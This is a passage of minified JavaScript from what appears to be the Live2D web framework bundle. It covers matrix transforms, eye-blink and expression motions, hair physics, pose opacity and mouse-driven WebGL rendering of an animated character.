l=o[h],$=o[h+1];l<n&&(n=l),l>s&&(s=l),$<_&&(_=$),$>a&&(a=$)}var u=this.modelMatrix.invertTransformX(i),p=this.modelMatrix.invertTransformY(e);return n<=u&&u<=s&&_<=p&&p<=a},r.prototype.hitTestSimpleCustom=function(t,i,e,r){return null!==this.live2DModel&&(e>=t[0]&&e<=i[0]&&r<=t[1]&&r>=i[1])},o.prototype=new AMotion,o.EXPRESSION_DEFAULT=\"DEFAULT\",o.TYPE_SET=0,o.TYPE_ADD=1,o.TYPE_MULT=2,o.loadJson=function(t){var i=new o,e=c.getPlatformManager(),r=e.jsonParseFromBytes(t);if(i.setFadeIn(parseInt(r.fade_in)>0?parseInt(r.fade_in):1e3),i.setFadeOut(parseInt(r.fade_out)>0?parseInt(r.fade_out):1e3),null==r.params)return i;var s=r.params,_=s.length;i.paramList=[];for(var a=0;a<_;a++){var h=s[a],l=h.id.toString(),$=parseFloat(h.val),u=o.TYPE_ADD,p=null!=h.calc?h.calc.toString():\"add\";if((u=\"add\"===p?o.TYPE_ADD:\"mult\"===p?o.TYPE_MULT:\"set\"===p?o.TYPE_SET:o.TYPE_ADD)==o.TYPE_ADD){var f=null==h.def?0:parseFloat(h.def);$-=f}else if(u==o.TYPE_MULT){var f=null==h.def?1:parseFloat(h.def);0==f&&(f=1),$/=f}var d=new n;d.id=l,d.type=u,d.value=$,i.paramList.push(d)}return i},o.prototype.updateParamExe=function(t,i,e,r){for(var n=this.paramList.length-1;n>=0;--n){var s=this.paramList[n];s.type==o.TYPE_ADD?t.addToParamFloat(s.id,s.value,e):s.type==o.TYPE_MULT?t.multParamFloat(s.id,s.value,e):s.type==o.TYPE_SET&&t.setParamFloat(s.id,s.value,e)}},s.prototype.calcNextBlink=function(){return UtSystem.getUserTimeMSec()+Math.random()*(2*this.blinkIntervalMsec-1)},s.prototype.setInterval=function(t){this.blinkIntervalMsec=t},s.prototype.setEyeMotion=function(t,i,e){this.closingMotionMsec=t,this.closedMotionMsec=i,this.openingMotionMsec=e},s.prototype.updateParam=function(t){var i,e=UtSystem.getUserTimeMSec(),r=0;switch(this.eyeState){case g.STATE_CLOSING:r=(e-this.stateStartTime)/this.closingMotionMsec,r>=1&&(r=1,this.eyeState=g.STATE_CLOSED,this.stateStartTime=e),i=1-r;break;case g.STATE_CLOSED:r=(e-this.stateStartTime)/this.closedMotionMsec,r>=1&&(this.eyeState=g.STATE_OPENING,this.stateStartTime=e),i=0;break;case g.STATE_OPENING:r=(e-this.stateStartTime)/this.openingMotionMsec,r>=1&&(r=1,this.eyeState=g.STATE_INTERVAL,this.nextBlinkTime=this.calcNextBlink()),i=r;break;case g.STATE_INTERVAL:this.nextBlinkTime<e&&(this.eyeState=g.STATE_CLOSING,this.stateStartTime=e),i=1;break;case g.STATE_FIRST:default:this.eyeState=g.STATE_INTERVAL,this.nextBlinkTime=this.calcNextBlink(),i=1}this.closeIfZero||(i=-i),t.setParamFloat(this.eyeID_L,i),t.setParamFloat(this.eyeID_R,i)};var g=function(){};g.STATE_FIRST=\"STATE_FIRST\",g.STATE_INTERVAL=\"STATE_INTERVAL\",g.STATE_CLOSING=\"STATE_CLOSING\",g.STATE_CLOSED=\"STATE_CLOSED\",g.STATE_OPENING=\"STATE_OPENING\",_.mul=function(t,i,e){var r,o,n,s=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];for(r=0;r<4;r++)for(o=0;o<4;o++)for(n=0;n<4;n++)s[r+4*o]+=t[r+4*n]*i[n+4*o];for(r=0;r<16;r++)e[r]=s[r]},_.prototype.identity=function(){for(var t=0;t<16;t++)this.tr[t]=t%5==0?1:0},_.prototype.getArray=function(){return this.tr},_.prototype.getCopyMatrix=function(){return new Float32Array(this.tr)},_.prototype.setMatrix=function(t){if(null!=this.tr&&this.tr.length==this.tr.length)for(var i=0;i<16;i++)this.tr[i]=t[i]},_.prototype.getScaleX=function(){return this.tr[0]},_.prototype.getScaleY=function(){return this.tr[5]},_.prototype.transformX=function(t){return this.tr[0]*t*8/3+this.tr[12]},_.prototype.transformY=function(t){return this.tr[5]*t*8/3+this.tr[13]},_.prototype.invertTransformX=function(t){return(t-this.tr[12])/this.tr[0]},_.prototype.invertTransformY=function(t){return(t-this.tr[13])/this.tr[5]},_.prototype.multTranslate=function(t,i){var e=[1,0,0,0,0,1,0,0,0,0,1,0,t,i,0,1];_.mul(e,this.tr,this.tr)},_.prototype.translate=function(t,i){this.tr[12]=t,this.tr[13]=i},_.prototype.translateX=function(t){this.tr[12]=t},_.prototype.translateY=function(t){this.tr[13]=t},_.prototype.multScale=function(t,i){var e=[t,0,0,0,0,i,0,0,0,0,1,0,0,0,0,1];_.mul(e,this.tr,this.tr)},_.prototype.scale=function(t,i){this.tr[0]=t,this.tr[5]=i},a.prototype=new _,a.prototype.setPosition=function(t,i){this.translate(t,i)},a.prototype.setCenterPosition=function(t,i){var e=this.width*this.getScaleX(),r=this.height*this.getScaleY();this.translate(t-e/2,i-r/2)},a.prototype.top=function(t){this.setY(t)},a.prototype.bottom=function(t){var i=this.height*this.getScaleY();this.translateY(t-i)},a.prototype.left=function(t){this.setX(t)},a.prototype.right=function(t){var i=this.width*this.getScaleX();this.translateX(t-i)},a.prototype.centerX=function(t){var i=this.width*this.getScaleX();this.translateX(t-i/2)},a.prototype.centerY=function(t){var i=this.height*this.getScaleY();this.translateY(t-i/2)},a.prototype.setX=function(t){this.translateX(t)},a.prototype.setY=function(t){this.translateY(t)},a.prototype.setHeight=function(t){var i=t/this.height,e=-i;this.scale(i,e)},a.prototype.setWidth=function(t){var i=t/this.width,e=-i;this.scale(i,e)},h.prototype=new MotionQueueManager,h.prototype.getCurrentPriority=function(){return this.currentPriority},h.prototype.getReservePriority=function(){return this.reservePriority},h.prototype.reserveMotion=function(t){return!(this.reservePriority>=t)&&(!(this.currentPriority>=t)&&(this.reservePriority=t,!0))},h.prototype.setReservePriority=function(t){this.reservePriority=t},h.prototype.updateParam=function(t){var i=MotionQueueManager.prototype.updateParam.call(this,t);return this.isFinished()&&(this.currentPriority=0),i},h.prototype.startMotionPrio=function(t,i){return i==this.reservePriority&&(this.reservePriority=0),this.currentPriority=i,this.startMotion(t,!1)},l.load=function(t){for(var i=new l,e=c.getPlatformManager(),r=e.jsonParseFromBytes(t),o=r.physics_hair,n=o.length,s=0;s<n;s++){var _=o[s],a=new PhysicsHair,h=_.setup,$=parseFloat(h.length),u=parseFloat(h.regist),p=parseFloat(h.mass);a.setup($,u,p);for(var f=_.src,d=f.length,g=0;g<d;g++){var y=f[g],m=y.id,T=PhysicsHair.Src.SRC_TO_X,P=y.ptype;\"x\"===P?T=PhysicsHair.Src.SRC_TO_X:\"y\"===P?T=PhysicsHair.Src.SRC_TO_Y:\"angle\"===P?T=PhysicsHair.Src.SRC_TO_G_ANGLE:UtDebug.error(\"live2d\",\"Invalid parameter:PhysicsHair.Src\");var S=parseFloat(y.scale),v=parseFloat(y.weight);a.addSrcParam(T,m,S,v)}for(var L=_.targets,M=L.length,g=0;g<M;g++){var E=L[g],m=E.id,T=PhysicsHair.Target.TARGET_FROM_ANGLE,P=E.ptype;\"angle\"===P?T=PhysicsHair.Target.TARGET_FROM_ANGLE:\"angle_v\"===P?T=PhysicsHair.Target.TARGET_FROM_ANGLE_V:UtDebug.error(\"live2d\",\"Invalid parameter:PhysicsHair.Target\");var S=parseFloat(E.scale),v=parseFloat(E.weight);a.addTargetParam(T,m,S,v)}i.physicsList.push(a)}return i},l.prototype.updateParam=function(t){for(var i=UtSystem.getUserTimeMSec()-this.startTimeMSec,e=0;e<this.physicsList.length;e++)this.physicsList[e].update(t,i)},$.load=function(t){for(var i=new $,e=c.getPlatformManager(),r=e.jsonParseFromBytes(t),o=r.parts_visible,n=o.length,s=0;s<n;s++){for(var _=o[s],a=_.group,h=a.length,l=new Array,p=0;p<h;p++){var f=a[p],d=new u(f.id);if(l[p]=d,null!=f.link){var g=f.link,y=g.length;d.link=new Array;for(var m=0;m<y;m++){var T=new u(g[m]);d.link.push(T)}}}i.partsGroups.push(l)}return i},$.prototype.updateParam=function(t){if(null!=t){t!=this.lastModel&&this.initParam(t),this.lastModel=t;var i=UtSystem.getUserTimeMSec(),e=0==this.lastTime?0:(i-this.lastTime)/1e3;this.lastTime=i,e<0&&(e=0);for(var r=0;r<this.partsGroups.length;r++)this.normalizePartsOpacityGroup(t,this.partsGroups[r],e),this.copyOpacityOtherParts(t,this.partsGroups[r])}},$.prototype.initParam=function(t){if(null!=t)for(var i=0;i<this.partsGroups.length;i++)for(var e=this.partsGroups[i],r=0;r<e.length;r++){e[r].initIndex(t);var o=e[r].partsIndex,n=e[r].paramIndex;if(!(o<0)){var s=0!=t.getParamFloat(n);if(t.setPartsOpacity(o,s?1:0),t.setParamFloat(n,s?1:0),null!=e[r].link)for(var _=0;_<e[r].link.length;_++)e[r].link[_].initIndex(t)}}},$.prototype.normalizePartsOpacityGroup=function(t,i,e){for(var r=-1,o=1,n=0;n<i.length;n++){var s=i[n].partsIndex,_=i[n].paramIndex;if(!(s<0)&&0!=t.getParamFloat(_)){if(r>=0)break;r=n,o=t.getPartsOpacity(s),o+=e/.5,o>1&&(o=1)}}r<0&&(r=0,o=1);for(var n=0;n<i.length;n++){var s=i[n].partsIndex;if(!(s<0))if(r==n)t.setPartsOpacity(s,o);else{var a,h=t.getPartsOpacity(s);a=o<.5?-.5*o/.5+1:.5*(1-o)/.5;var l=(1-a)*(1-o);l>.15&&(a=1-.15/(1-o)),h>a&&(h=a),t.setPartsOpacity(s,h)}}},$.prototype.copyOpacityOtherParts=function(t,i){for(var e=0;e<i.length;e++){var r=i[e];if(null!=r.link&&!(r.partsIndex<0))for(var o=t.getPartsOpacity(r.partsIndex),n=0;n<r.link.length;n++){var s=r.link[n];s.partsIndex<0||t.setPartsOpacity(s.partsIndex,o)}}},u.prototype.initIndex=function(t){this.paramIndex=t.getParamIndex(\"VISIBLE:\"+this.id),this.partsIndex=t.getPartsDataIndex(PartsDataID.getID(this.id)),t.setParamFloat(this.paramIndex,1)},p.FRAME_RATE=30,p.prototype.setPoint=function(t,i){this.faceTargetX=t,this.faceTargetY=i},p.prototype.getX=function(){return this.faceX},p.prototype.getY=function(){return this.faceY},p.prototype.update=function(){var t=40/7.5/p.FRAME_RATE;if(0==this.lastTimeSec)return void(this.lastTimeSec=UtSystem.getUserTimeMSec());var i=UtSystem.getUserTimeMSec(),e=(i-this.lastTimeSec)*p.FRAME_RATE/1e3;this.lastTimeSec=i;var r=.15*p.FRAME_RATE,o=e*t/r,n=this.faceTargetX-this.faceX,s=this.faceTargetY-this.faceY;if(!(Math.abs(n)<=this.EPSILON&&Math.abs(s)<=this.EPSILON)){var _=Math.sqrt(n*n+s*s),a=t*n/_,h=t*s/_,l=a-this.faceVX,$=h-this.faceVY,u=Math.sqrt(l*l+$*$);(u<-o||u>o)&&(l*=o/u,$*=o/u,u=o),this.faceVX+=l,this.faceVY+=$;var f=.5*(Math.sqrt(o*o+16*o*_-8*o*_)-o),c=Math.sqrt(this.faceVX*this.faceVX+this.faceVY*this.faceVY);c>f&&(this.faceVX*=f/c,this.faceVY*=f/c),this.faceX+=this.faceVX,this.faceY+=this.faceVY}},f.prototype=new _,f.prototype.getMaxScale=function(){return this.max},f.prototype.getMinScale=function(){return this.min},f.prototype.setMaxScale=function(t){this.max=t},f.prototype.setMinScale=function(t){this.min=t},f.prototype.isMaxScale=function(){return this.getScaleX()==this.max},f.prototype.isMinScale=function(){return this.getScaleX()==this.min},f.prototype.adjustTranslate=function(t,i){this.tr[0]*this.maxLeft+(this.tr[12]+t)>this.screenLeft&&(t=this.screenLeft-this.tr[0]*this.maxLeft-this.tr[12]),this.tr[0]*this.maxRight+(this.tr[12]+t)<this.screenRight&&(t=this.screenRight-this.tr[0]*this.maxRight-this.tr[12]),this.tr[5]*this.maxTop+(this.tr[13]+i)<this.screenTop&&(i=this.screenTop-this.tr[5]*this.maxTop-this.tr[13]),this.tr[5]*this.maxBottom+(this.tr[13]+i)>this.screenBottom&&(i=this.screenBottom-this.tr[5]*this.maxBottom-this.tr[13]);var e=[1,0,0,0,0,1,0,0,0,0,1,0,t,i,0,1];_.mul(e,this.tr,this.tr)},f.prototype.adjustScale=function(t,i,e){var r=e*this.tr[0];r<this.min?this.tr[0]>0&&(e=this.min/this.tr[0]):r>this.max&&this.tr[0]>0&&(e=this.max/this.tr[0]);var o=[1,0,0,0,0,1,0,0,0,0,1,0,t,i,0,1],n=[e,0,0,0,0,e,0,0,0,0,1,0,0,0,0,1],s=[1,0,0,0,0,1,0,0,0,0,1,0,-t,-i,0,1];_.mul(s,this.tr,this.tr),_.mul(n,this.tr,this.tr),_.mul(o,this.tr,this.tr)},f.prototype.setScreenRect=function(t,i,e,r){this.screenLeft=t,this.screenRight=i,this.screenTop=r,this.screenBottom=e},f.prototype.setMaxScreenRect=function(t,i,e,r){this.maxLeft=t,this.maxRight=i,this.maxTop=r,this.maxBottom=e},f.prototype.getScreenLeft=function(){return this.screenLeft},f.prototype.getScreenRight=function(){return this.screenRight},f.prototype.getScreenBottom=function(){return this.screenBottom},f.prototype.getScreenTop=function(){return this.screenTop},f.prototype.getMaxLeft=function(){return this.maxLeft},f.prototype.getMaxRight=function(){return this.maxRight},f.prototype.getMaxBottom=function(){return this.maxBottom},f.prototype.getMaxTop=function(){return this.maxTop},c.platformManager=null,c.getPlatformManager=function(){return c.platformManager},c.setPlatformManager=function(t){c.platformManager=t},t.exports={L2DTargetPoint:p,Live2DFramework:c,L2DViewMatrix:f,L2DPose:$,L2DPartsParam:u,L2DPhysics:l,L2DMotionManager:h,L2DModelMatrix:a,L2DMatrix44:_,EYE_STATE:g,L2DEyeBlink:s,L2DExpressionParam:n,L2DExpressionMotion:o,L2DBaseModel:r}},function(t,i,e){\"use strict\";var r={DEBUG_LOG:!1,DEBUG_MOUSE_LOG:!1,DEBUG_DRAW_HIT_AREA:!1,DEBUG_DRAW_ALPHA_MODEL:!1,VIEW_MAX_SCALE:2,VIEW_MIN_SCALE:.8,VIEW_LOGICAL_LEFT:-1,VIEW_LOGICAL_RIGHT:1,VIEW_LOGICAL_MAX_LEFT:-2,VIEW_LOGICAL_MAX_RIGHT:2,VIEW_LOGICAL_MAX_BOTTOM:-2,VIEW_LOGICAL_MAX_TOP:2,PRIORITY_NONE:0,PRIORITY_IDLE:1,PRIORITY_SLEEPY:2,PRIORITY_NORMAL:3,PRIORITY_FORCE:4,MOTION_GROUP_IDLE:\"idle\",MOTION_GROUP_SLEEPY:\"sleepy\",MOTION_GROUP_TAP_BODY:\"tap_body\",MOTION_GROUP_FLICK_HEAD:\"flick_head\",MOTION_GROUP_PINCH_IN:\"pinch_in\",MOTION_GROUP_PINCH_OUT:\"pinch_out\",MOTION_GROUP_SHAKE:\"shake\",HIT_AREA_HEAD:\"head\",HIT_AREA_BODY:\"body\"};t.exports=r},function(t,i,e){\"use strict\";function r(t){n=t}function o(){return n}Object.defineProperty(i,\"__esModule\",{value:!0}),i.setContext=r,i.getContext=o;var n=void 0},function(t,i,e){\"use strict\";function r(){}r.matrixStack=[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1],r.depth=0,r.currentMatrix=[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1],r.tmp=new Array(16),r.reset=function(){this.depth=0},r.loadIdentity=function(){for(var t=0;t<16;t++)this.currentMatrix[t]=t%5==0?1:0},r.push=function(){var t=(this.depth,16*(this.depth+1));this.matrixStack.length<t+16&&(this.matrixStack.length=t+16);for(var i=0;i<16;i++)this.matrixStack[t+i]=this.currentMatrix[i];this.depth++},r.pop=function(){--this.depth<0&&(myError(\"Invalid matrix stack.\"),this.depth=0);for(var t=16*this.depth,i=0;i<16;i++)this.currentMatrix[i]=this.matrixStack[t+i]},r.getMatrix=function(){return this.currentMatrix},r.multMatrix=function(t){var i,e,r;for(i=0;i<16;i++)this.tmp[i]=0;for(i=0;i<4;i++)for(e=0;e<4;e++)for(r=0;r<4;r++)this.tmp[i+4*e]+=this.currentMatrix[i+4*r]*t[r+4*e];for(i=0;i<16;i++)this.currentMatrix[i]=this.tmp[i]},t.exports=r},function(t,i,e){t.exports=e(5)},function(t,i,e){\"use strict\";function r(t){return t&&t.__esModule?t:{default:t}}function o(t){C=document.getElementById(t),C.addEventListener&&(window.addEventListener(\"click\",g),window.addEventListener(\"mousedown\",g),window.addEventListener(\"mousemove\",g),window.addEventListener(\"mouseup\",g),document.addEventListener(\"mouseout\",g),window.addEventListener(\"touchstart\",y),window.addEventListener(\"touchend\",y),window.addEventListener(\"touchmove\",y))}function n(t){var i=C.width,e=C.height;N=new M.L2DTargetPoint;var r=e/i,o=w.default.VIEW_LOGICAL_LEFT,n=w.default.VIEW_LOGICAL_RIGHT,_=-r,h=r;if(window.Live2D.captureFrame=!1,B=new M.L2DViewMatrix,B.setScreenRect(o,n,_,h),B.setMaxScreenRect(w.default.VIEW_LOGICAL_MAX_LEFT,w.default.VIEW_LOGICAL_MAX_RIGHT,w.default.VIEW_LOGICAL_MAX_BOTTOM,w.default.VIEW_LOGICAL_MAX_TOP),B.setMaxScale(w.default.VIEW_MAX_SCALE),B.setMinScale(w.default.VIEW_MIN_SCALE),U=new M.L2DMatrix44,U.multScale(1,i/e),G=new M.L2DMatrix44,G.multTranslate(-i/2,-e/2),G.multScale(2/i,-2/i),F=v(),(0,D.setContext)(F),!F)return console.error(\"Failed to create WebGL context.\"),void(window.WebGLRenderingContext&&console.error(\"Your browser don't support WebGL, check https://get.webgl.org/ for futher information.\"));window.Live2D.setGL(F),F.clearColor(0,0,0,0),a(t),s()}function s(){b||(b=!0,function t(){_();var i=window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||window.msRequestAnimationFrame;if(window.Live2D.captureFrame){window.Live2D.captureFrame=!1;var e=document.createElement(\"a\");document.body.appendChild(e),e.setAttribute(\"type\",\"hidden\"),e.href=C.toDataURL(),e.download=window.Live2D.captureName||\"live2d.png\",e.click()}i(t,C)}())}function _(){O.default.reset(),O.default.loadIdentity(),N.update(),R.setDrag(N.getX(),N.getY()),F.clear(F.COLOR_BUFFER_BIT),O.default.multMatrix(U.getArray()),O.default.multMatrix(B.getArray()),O.default.push();for(var t=0;t<R.numModels();t++){var i=R.getModel(t);if(null==i)return;i.initialized&&!i.updating&&(i.update(),i.draw(F))}O.default.pop()}function a(t){R.reloadFlg=!0,R.count++,R.changeModel(F,t)}function h(t,i){return t.x*i.x+t.y*i.y}function l(t,i){var e=Math.sqrt(t*t+i*i);return{x:t/e,y:i/e}}function $(t,i,e){function r(t,i){return 180*Math.acos(h({x:0,y:1},l(t,i)))/Math.PI}if(i.x<e.left+e.width&&i.y<e.top+e.height&&i.x>e.left&&i.y>e.top)return i;var o=t.x-i.x,n=t.y-i.y,s=r(o,n);i.x<t.x&&(s=360-s);var _=360-r(e.left-t.x,-1*(e.top-t.y)),a=360-r(e.left-t.x,-1*(e.top+e.height-t.y)),$=r(e.left+e.width-t.x,-1*(e.top-t.y)),u=r(e.left+e.width-t.x,-1*(e.top+e.height-t.y)),p=n/o,f={};if(s<$){var c=e.top-t.y,d=c/p;f={y:t.y+c,x:t.x+d}}else if(s<u){var g=e.left+e.width-t.x,y=g*p;f={y:t.y+y,x:t.x+g}}else if(s<a){var m=e.top+e.height-t.y,T=m/p;f={y:t.y+m,x:t.x+T}}else if(s<_){var P=t.x-e.left,S=P*p;f={y:t.y-S,x:t.x-P}}else{var v=e.top-t.y,L=v/p;f={y:t.y+v,x:t.x+L}}return f}function u(t){Y=!0;var i=C.getBoundingClientRect(),e=P(t.clientX-i.left),r=S(t.clientY-i.top),o=$({x:i.left+i.width/2,y:i.top+i.height*X},{x:t.clientX,y:t.clientY},i),n=m(o.x-i.left),s=T(o.y-i.top);w.default.DEBUG_MOUSE_LOG&&console.log(\"onMouseMove device( x:\"+t.clientX+\" y:\"+t.clientY+\" ) view( x:\"+n+\" y:\"+s+\")\"),k=e,V=r,N.setPoint(n,s)}function p(t){Y=!0;var i=C.getBoundingClientRect(),e=P(t.clientX-i.left),r=S(t.clientY-i.top),o=$({x:i.left+i.width/2,y:i.top+i.height*X},{x:t.clientX,y:t.clientY},i),n=m(o.x-i.left),s=T(o.y-i.top);w.default.DEBUG_MOUSE_LOG&&console.log(\"onMouseDown device( x:\"+t.clientX+\" y:\"+t.clientY+\" ) view( x:\"+n+\" y:\"+s+\")\"),k=e,V=r,R.tapEvent(n,s)}function f(t){var i=C.getBoundingClientRect(),e=P(t.clientX-i.left),r=S(t.clientY-i.top),o=$({x:i.left+i.width/2,y:i.top+i.height*X},{x:t.clientX,y:t.clientY},i),n=m(o.x-i.left),s=T(o.y-i.top);w.default.DEBUG_MOUSE_LOG&&console.log(\"onMouseMove device( x:\"+t.clientX+\" y:\"+t.clientY+\" ) view( x:\"+n+\" y:\"+s+\")\"),Y&&(k=e,V=r,N.setPoint(n,s))}function c(){Y&&(Y=!1),N.setPoint(0,0)}function d(){w.default.DEBUG_LOG&&console.log(\"Set Session Storage.\"),sessionStorage.setItem(\"Sleepy\",\"1\")}function g(t){if(\"mousewheel\"==t.type);else if(\"mousedown\"==t.type)p(t);else if(\"mousemove\"==t.type){var i=sessionStorage.getItem(\"Sleepy\");\"1\"===i&&sessionStorage.setItem(\"Sleepy\",\"0\"),u(t)}else if(\"mouseup\"==t.type){if(\"button\"in t&&0!=t.button)return}else if(\"mouseout\"==t.type){w.default.DEBUG_LOG&&console.log(\"Mouse out Window.\"),c();var e=sessionStorage.getItem(\"SleepyTimer\");window.clearTimeout(e),e=window.setTimeout(d,5e4),sessionStorage.setItem(\"SleepyTimer\",e)}}function y(t){var i=t.touches[0];\"touchstart\"==t.type?1==t.touches.length&&u(i):\"touchmove\"==t.type?f(i):\"touchend\"==t.type&&c()}function m(t){var i=G.transformX(t);return B.invertTransformX(i)}function T(t){var i=G.transformY(t);return B.invertTransformY(i)}function P(t){return G.transformX(t)}function S(t){return G.transformY(t)}function v(){for(var t=[\"webgl\",\"experimental-webgl\",\"webkit-3d\",\"moz-webgl\"],i=0;i<t.length;i++)try{var e=C.getContext(t[i],{premultipliedAlpha:!0});if(e)return e}catch(t){}return null}function L(t,i,e){X=void 0===e?.5:e,o(t),n(i)}e(6);var M=e(0),E=e(8),A=r(E),I=e(1),w=r(I),x=e(3),O=r(x),D=e(2),R=(window.navigator.platform.toLowerCase(),new A.default),b=!1,F=null,C=null,N=null,B=null,U=null,G=null,Y=!1,k=0,V=0,X=.5;window.loadlive2d=L},function(t,i,e){\"use strict\";(function(t){!function(){function i(){At||(this._$MT=null,this._$5S=null,this._$NP=0,i._$42++,this._$5S=new Y(this))}function e(t){if(!At){this.clipContextList=new Array,this.glcontext=t.gl,this.dp_webgl=t,this.curFrameNo=0,this.firstError_clipInNotUpdate=!0,this.colorBuffer=0,this.isInitGLFBFunc=!1,this.tmpBoundsOnModel=new S,at.glContext.length>at.frameBuffers.length&&(this.curFrameNo=this.getMaskRenderTexture()),this.tmpModelToViewMatrix=new R,this.tmpMatrix2=new R,this.tmpMatrixForMask=new R,this.tmpMatrixForDraw=new R,this.CHANNEL_COLORS=new Array;var i=new A;i=new A,i.r=0,i.g=0,i.b=0,i.a=1,this.CHANNEL_COLORS.push(i),i=new A,i.r=1,i.g=0,i.b=0,i.a=0,this.CHANNEL_COLORS.push(i),i=new A,i.r=0,i.g=1,i.b=0,i.a=0,this.CHANNEL_COLORS.push(i),i=new A,i.r=0,i.g=0,i.b=1,i.a=0,this.CHANNEL_COLORS.push(i);for(var e=0;e<this.CHANNEL_COLORS.length;e++)this.dp_webgl.setChannelFlagAsColor(e,this.CHANNEL_COLORS[e])}}function r(t,i,e){this.clipIDList=new Array,this.clipIDList=e,this.clippingMaskDrawIndexList=new Array;for(var r=0;r<e.length;r++)this.clippingMaskDrawIndexList.push(i.getDrawDataIndex(e[r]));this.clippedDrawContextList=new Array,this.isUsing=!0,this.layoutChannelNo=0,this.layoutBounds=new S,this.allClippedDrawRect=new S,this.matrixForMask=new Float32Array(16),this.matrixForDraw=new Float32Array(16),this.owner=t}function o(t,i){this._$gP=t,this.drawDataIndex=i}function n(){At||(this.color=null)}function s(){At||(this._$dP=null,this._$eo=null,this._$V0=null,this._$dP=1e3,this._$eo=1e3,this._$V0=1,this._$a0())}function _(){}function a(){this._$r=null,this._$0S=null}function h(){At||(this.x=null,this.y=null,this.width=null,this.height=null)}function l(t){At||et.prototype.constructor.call(this,t)}function $(){}function u(t){At||et.prototype.constructor.call(this,t)}function p(){At||(this._$vo=null,this._$F2=null,this._$ao=400,this._$1S=400,p._$42++)}function f(){At||(this.p1=new c,this.p2=new c,this._$Fo=0,this._$Db=0,this._$L2=0,this._$M2=0,this._$ks=0,this._$9b=0,this._$iP=0,this._$iT=0,this._$lL=new Array,this._$qP=new Array,this.setup(.3,.5,.1))}function c(){this._$p=1,this.x=0,this.y=0,this.vx=0,this.vy=0,this.ax=0,this.ay=0,this.fx=0,this.fy=0,this._$s0=0,this._$70=0,this._$7L=0,this._$HL=0}function d(t,i,e){this._$wL=null,this.scale=null,this._$V0=null,this._$wL=t,this.scale=i,this._$V0=e}function g(t,i,e,r){d.prototype.constructor.call(this,i,e,r),this._$tL=null,this._$tL=t}function y(t,i,e){this._$wL=null,this.scale=null,this._$V0=null,this._$wL=t,this.scale=i,this._$V0=e}function T(t,i,e,r){y.prototype.constructor.call(this,i,e,r),this._$YP=null,this._$YP=t}function P(){At||(this._$fL=0,this._$gL=0,this._$B0=1,this._$z0=1,this._$qT=0,this.reflectX=!1,this.reflectY=!1)}function S(){At||(this.x=null,this.y=null,this.width=null,this.height=null)}function v(){}function L(){At||(this.x=null,this.y=null)}function M(){At||(this._$gP=null,this._$dr=null,this._$GS=null,this._$qb=null,this._$Lb=null,this._$mS=null,this.clipID=null,this.clipIDList=new Array)}function E(){At||(this._$Eb=E._$ps,this._$lT=1,this._$C0=1,this._$tT=1,this._$WL=1,this.culling=!1,this.matrix4x4=new Float32Array(16),this.premultipliedAlpha=!1,this.anisotropy=0,this.clippingProcess=E.CLIPPING_PROCESS_NONE,this.clipBufPre_clipContextMask=null,this.clipBufPre_clipContextDraw=null,this.CHANNEL_COLORS=new Array)}function A(){At||(this.a=1,this.r=1,this.g=1,this.b=1,this.scale=1,this._$ho=1,this.blendMode=at.L2D_COLOR_BLEND_MODE_MULT)}function I(){At||(this._$kP=null,this._$dr=null,this._$Ai=!0,this._$mS=null)}function w(){}function x(){At||(this._$VP=0,this._$wL=null,this._$GP=null,this._$8o=x._$ds,this._$2r=-1,this._$O2=0,this._$ri=0)}function O(){}function D(){At||(this._$Ob=null)}function R(){this.m=new Float32Array(16),this.identity()}function b(t){At||et.prototype.constructor.call(this,t)}function F(){At||(this._$7=1,this._$f=0,this._$H=0,this._$g=1,this._$k=0,this._$w=0,this._$hi=STATE_IDENTITY,this._$Z=_$pS)}function C(){At||(s.prototype.constructor.call(this),this.motions=new Array,this._$7r=null,this._$7r=C._$Co++,this._$D0=30,this._$yT=0,this._$E=!0,this.loopFadeIn=!0,this._$AS=-1,_$a0())}function N(){this._$P=new Float32Array(100),this.size=0}function B(){this._$4P=null,this._$I0=null,this._$RP=null}function U(){}function G(){}function Y(t){At||(this._$QT=!0,this._$co=-1,this._$qo=0,this._$pb=new Array(Y._$is),this._$_2=new Float32Array(Y._$is),this._$vr=new Float32Array(Y._$is),this._$Rr=new Float32Array(Y._$is),this._$Or=new Float32Array(Y._$is),this._$fs=new Float32Array(Y._$is),this._$Js=new Array(Y._$is),this._$3S=new Array,this._$aS=new Array,this._$Bo=null,this._$F2=new Array,this._$db=new Array,this._$8b=new Array,this._$Hr=new Array,this._$Ws=null,this._$Vs=null,this._$Er=null,this._$Es=new Int16Array(U._$Qb),this._$ZP=new Float32Array(2*U._$1r),this._$Ri=t,this._$b0=Y._$HP++,this.clipManager=null,this.dp_webgl=null)}function k(){}function V(){At||(this._$12=null,this._$bb=null,this._$_L=null,this._$jo=null,this._$iL=null,this._$0L=null,this._$Br=null,this._$Dr=null,this._$Cb=null,this._$mr=null,this._$_L=wt.STATE_FIRST,this._$Br=4e3,this._$Dr=100,this._$Cb=50,this._$mr=150,this._$jo=!0,this._$iL=\"PARAM_EYE_L_OPEN\",this._$0L=\"PARAM_EYE_R_OPEN\")}function X(){At||(E.prototype.constructor.call(this),this._$sb=new Int32Array(X._$As),this._$U2=new Array,this.transform=null,this.gl=null,null==X._$NT&&(X._$NT=X._$9r(256),X._$vS=X._$9r(256),X._$no=X._$vb(256)))}function z(){At||(I.prototype.constructor.call(this),this._$GS=null,this._$Y0=null)}function H(t){_t.prototype.constructor.call(this,t),this._$8r=I._$ur,this._$Yr=null,this._$Wr=null}function W(){At||(M.prototype.constructor.call(this),this._$gP=null,this._$dr=null,this._$GS=null,this._$qb=null,this._$Lb=null,this._$mS=null)}function j(){At||(this._$NL=null,this._$3S=null,this._$aS=null,j._$42++)}function q(){At||(i.prototype.constructor.call(this),this._$zo=new X)}function J(){At||(s.prototype.constructor.call(this),this.motions=new Array,this._$o2=null,this._$7r=J._$Co++,this._$D0=30,this._$yT=0,this._$E=!1,this.loopFadeIn=!0,this._$rr=-1,this._$eP=0)}function Q(t,i){return String.fromCharCode(t.getUint8(i))}function N(){this._$P=new Float32Array(100),this.size=0}function B(){this._$4P=null,this._$I0=null,this._$RP=null}function Z(){At||(I.prototype.constructor.call(this),this._$o=0,this._$A=0,this._$GS=null,this._$Eo=null)}function K(t){_t.prototype.constructor.call(this,t),this._$8r=I._$ur,this._$Cr=null,this._$hr=null}function 